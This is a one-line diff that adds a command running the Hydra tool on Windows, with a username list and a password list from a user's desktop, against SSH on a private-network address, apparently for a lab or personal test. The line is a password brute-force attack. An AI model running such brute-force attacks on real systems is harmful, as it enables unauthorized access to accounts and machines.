@@ -1,0 +1,1 @@
+ .\hydra.exe -L C:\Users\Lorenzo\Desktop\names.txt -P C:\Users\Lorenzo\Desktop\passwd.txt ssh://192.168.200.109
